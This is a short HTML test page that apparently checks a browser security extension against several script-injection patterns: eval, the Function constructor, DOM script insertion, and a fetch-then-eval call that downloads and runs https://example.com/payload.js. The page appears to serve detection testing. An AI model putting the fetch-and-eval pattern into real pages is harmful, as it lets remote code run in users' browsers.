<!DOCTYPE html>
<html>

<head>
  <title>ASI Extension Test</title>
</head>

<body>
  <h1>ASI Extension Testing</h1>
  <p>Testing various XSS payloads...</p>

  <button onclick="testEval()">Test: eval()</button>
  <button onclick="testFunction()">Test: Function()</button>
  <button onclick="testFetchEval()">Test: Fetch + Eval</button>
  <button onclick="testMutation()">Test: DOM Mutation</button>

  <script>
    function testEval() {
      console.log('Testing eval...');
      eval('alert("XSS via eval")');
    }

    function testFunction() {
      console.log('Testing Function constructor...');
      const fn = new Function('alert("XSS via Function")');
      fn();
    }

    function testFetchEval() {
      console.log('Testing fetch + eval pattern...');
      fetch('https://example.com/payload.js')
        .then(r => r.text())
        .then(code => eval(code))
        .catch(e => console.log('Expected fetch failure:', e.message));
    }

    function testMutation() {
      console.log('Testing DOM mutation...');
      const script = document.createElement('script');
      script.textContent = 'alert("XSS via mutation")';
      document.body.appendChild(script);
    }
  </script>
</body>

</html>
